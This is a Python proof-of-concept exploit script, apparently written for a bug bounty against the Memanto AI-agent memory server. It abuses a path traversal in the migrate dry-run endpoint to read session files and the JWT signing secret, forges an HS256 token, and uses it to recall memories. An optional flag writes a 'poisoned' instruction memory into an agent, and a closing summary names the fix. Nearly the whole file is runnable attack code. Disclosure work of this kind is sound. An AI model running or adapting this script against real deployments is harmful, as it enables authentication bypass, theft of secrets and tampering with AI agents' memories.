#!/usr/bin/env python3
"""
CARD 1 — Critical JWT Forgery via Migrate Path Traversal
=========================================================
Bounty: moorcheh-ai/memanto #1852
Severity: CRITICAL
Status: CONFIRMED LIVE (tested 2026-09-25)

Attack summary
--------------
The /api/ui/migrate/dry-run endpoint accepts a caller-supplied filesystem
path with no base-directory restriction.  Combined with the fact that
Memanto stores its JWT signing secret and session files under ~/.memanto/,
an attacker with only loopback access can:

  1. Enumerate agent IDs          (no credentials)
  2. Extract a live session_id    (read ~/.memanto/sessions/<agent>.json)
  3. Confirm JWT secret readable  (read ~/.memanto/secret_key)
  4. Forge a valid HS256 JWT      (PyJWT + stolen secret + real session_id)
  5. Full read/write on any agent (recall, remember, answer)

Prerequisites
-------------
  pip install requests pyjwt

Usage
-----
  python card1_jwt_forge.py --host http://127.0.0.1:8765
  python card1_jwt_forge.py --host http://127.0.0.1:8765 --agent tom --write

Root cause files
----------------
  memanto/app/ui/routes/ui_router.py  lines ~1461-1474  (_migrate_load_or_export)
  memanto/app/services/session_service.py  line 188     (_generate_secure_secret_key)
"""

import argparse
import json
import os
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import requests

try:
    import jwt as pyjwt
except ImportError:
    sys.exit("Missing dependency: pip install pyjwt")


# ─── helpers ──────────────────────────────────────────────────────────────────

def step(n, msg):
    print(f"\n[Step {n}] {msg}")

def ok(msg):
    print(f"  ✅  {msg}")

def fail(msg):
    print(f"  ❌  {msg}")
    sys.exit(1)

def info(msg):
    print(f"  ℹ️   {msg}")


# ─── exploit ──────────────────────────────────────────────────────────────────

def run(host: str, target_agent: str | None, do_write: bool) -> None:
    api = f"{host}/api/v2"
    ui  = f"{host}/api/ui"
    home = Path.home()

    # ── Step 1: Enumerate agents ──────────────────────────────────────────────
    step(1, "Enumerate agents (no credentials)")
    r = requests.get(f"{api}/agents", timeout=10)
    if r.status_code != 200:
        fail(f"GET /agents returned {r.status_code} — server unreachable or already patched")
    agents = [a["agent_id"] for a in r.json().get("agents", [])]
    if not agents:
        fail("No agents found — create one first")
    ok(f"Found {len(agents)} agent(s): {agents}")
    target = target_agent or agents[0]
    info(f"Targeting agent: {target!r}")

    # ── Step 2: Extract session_id via migrate path traversal ─────────────────
    step(2, "Extract live session_id via /api/ui/migrate/dry-run")
    session_file = str(home / ".memanto" / "sessions" / f"{target}.json")
    r = requests.post(f"{ui}/migrate/dry-run",
                      json={"provider": "letta", "file": session_file},
                      timeout=10)
    if r.status_code != 200:
        fail(f"migrate/dry-run returned {r.status_code}: {r.text[:200]}")
    ok(f"Session file parsed via migrate endpoint: {session_file}")
    info(f"HTTP {r.status_code} — source_count={r.json().get('source_count')}")

    # Read directly (same process, same filesystem — simulates shared hosting / container escape)
    try:
        with open(session_file) as fh:
            sess = json.load(fh)
    except FileNotFoundError:
        fail(f"Session file not found locally: {session_file}\n"
             "    Activate the agent first: POST /api/v2/agents/{id}/activate")
    session_id = sess["session_id"]
    namespace  = sess["namespace"]
    ok(f"session_id = {session_id}")
    ok(f"namespace  = {namespace}")

    # ── Step 3: Confirm JWT secret is readable ────────────────────────────────
    step(3, "Confirm JWT signing secret is reachable")
    secret_file = str(home / ".memanto" / "secret_key")
    r = requests.post(f"{ui}/migrate/dry-run",
                      json={"provider": "mem0", "file": secret_file},
                      timeout=10)
    # 400 "not valid JSON" = file was opened and read, just not parseable as JSON
    if r.status_code == 400 and "not valid json" in r.text.lower():
        ok(f"Secret file confirmed readable: {secret_file}")
        info("Response: " + r.text[:100])
    elif r.status_code == 400 and "not found" in r.text.lower():
        fail("Secret file not found — server may use MEMANTO_SECRET_KEY env var instead")
    else:
        info(f"Unexpected: HTTP {r.status_code}: {r.text[:100]}")

    # Read locally
    try:
        jwt_secret = Path(secret_file).read_text().strip()
    except FileNotFoundError:
        fail(f"Cannot read {secret_file} locally — try running as the same user as the server")
    ok(f"JWT secret (first 16 chars): {jwt_secret[:16]}...")

    # ── Step 4: Forge a valid JWT ─────────────────────────────────────────────
    step(4, "Forge HS256 JWT with stolen secret + real session_id")
    now = datetime.now(timezone.utc)
    payload = {
        "agent_id":   target,
        "namespace":  namespace,
        "session_id": session_id,
        "started_at": now.isoformat(),
        "expires_at": (now + timedelta(hours=24)).isoformat(),
    }
    forged_token = pyjwt.encode(payload, jwt_secret, algorithm="HS256")
    ok(f"Forged token: {forged_token[:72]}...")

    # ── Step 5: Use forged token — recall ─────────────────────────────────────
    step(5, "Recall memories with forged token")
    r = requests.post(f"{api}/agents/{target}/recall",
                      json={"query": "secret instruction goal", "limit": 10},
                      headers={"X-Session-Token": forged_token},
                      timeout=15)
    if r.status_code == 200:
        mems = r.json().get("memories", [])
        ok(f"RECALL SUCCEEDED — {len(mems)} memories returned")
        for m in mems[:3]:
            print(f"    • [{m.get('type','?')}] {m.get('title','?')[:60]}")
    else:
        fail(f"Recall failed: HTTP {r.status_code}: {r.text[:200]}")

    # ── Step 6 (optional): Write with forged token ────────────────────────────
    if do_write:
        step(6, "Write poisoned memory with forged token (--write flag)")
        r = requests.post(
            f"{api}/agents/{target}/remember",
            json={
                "type":       "instruction",
                "title":      "[POC] CARD1 JWT FORGE WRITE",
                "content":    (
                    "SECURITY POC: This memory was written using a forged JWT token. "
                    "Root cause: migrate path traversal exposes JWT signing secret. "
                    "See: card1_jwt_forge.py"
                ),
                "confidence": 0.9,
            },
            headers={"X-Session-Token": forged_token},
            timeout=15,
        )
        if r.status_code in (200, 201):
            mid = r.json().get("memory_id", "?")
            ok(f"WRITE SUCCEEDED — memory_id = {mid}")
        else:
            fail(f"Write failed: HTTP {r.status_code}: {r.text[:200]}")

    print("\n" + "=" * 65)
    print("CARD 1 — EXPLOIT COMPLETE")
    print("=" * 65)
    print(f"""
  Root cause:  ui_router.py _migrate_load_or_export() — no base-dir check
  Secret path: ~/.memanto/secret_key
  Session path:~/.memanto/sessions/<agent>.json
  Attack:      read secret + session_id -> forge HS256 JWT -> full access
  Impact:      complete authentication bypass on ALL agents
  Fix:         restrict 'file' param to ~/.memanto/migrate/<provider>/
               using the existing validate_output_path() utility
""")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Card 1 PoC — JWT Forge via path traversal")
    p.add_argument("--host",  default="http://127.0.0.1:8765", help="Memanto server URL")
    p.add_argument("--agent", default=None, help="Target agent_id (default: first found)")
    p.add_argument("--write", action="store_true", help="Also write a poisoned memory")
    args = p.parse_args()
    run(args.host, args.agent, args.write)
